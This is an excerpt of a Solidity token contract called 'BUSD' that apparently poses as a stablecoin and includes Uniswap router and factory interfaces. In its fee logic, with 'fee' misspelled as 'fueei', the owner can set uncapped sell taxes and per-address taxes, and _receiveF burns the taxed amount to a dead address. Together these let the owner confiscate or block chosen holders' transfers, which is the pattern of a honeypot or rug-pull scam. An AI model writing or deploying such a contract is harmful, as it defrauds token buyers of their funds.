...
interface IUniswapV2Factory {
    ...
    function fueeiTo() external view returns (address);
    function fueeiToSetter() external view returns (address);
    ...
    function setfueeiTo(address) external;
    function setfueeiToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfueeiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfueeiOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfueeiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfueeiOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfueeiOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BUSD is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfueei = 0;

    uint256 private _defaultBuyfueei = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfueei;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfueei = _value;
    }

    function setSlipfueei(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfueei[_address] = _value;
    }

    function getSlipfueei(address _address) external view onlyownar returns (uint256) {
        return _slipfueei[_address];
    }


    function setMAccountfueei(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfueei(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefueeiAmount = 0;

        if (rF) {
            uint256 tradefueei = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefueei = _defaultSellfueei;
                }
                if (from == uniswapV2Pair) {

                    tradefueei = _defaultBuyfueei;
                }
            }
            if (_slipfueei[from] > 0) {
                tradefueei = _slipfueei[from];
            }

            tradefueeiAmount = _Amount.mul(tradefueei).div(100);
        }


        if (tradefueeiAmount > 0) {
            _balances[from] = _balances[from].sub(tradefueeiAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefueeiAmount);
            emit Transfer(from, _deadAddress, tradefueeiAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefueeiAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefueeiAmount);
        emit Transfer(from, _to, _Amount - tradefueeiAmount);
    }
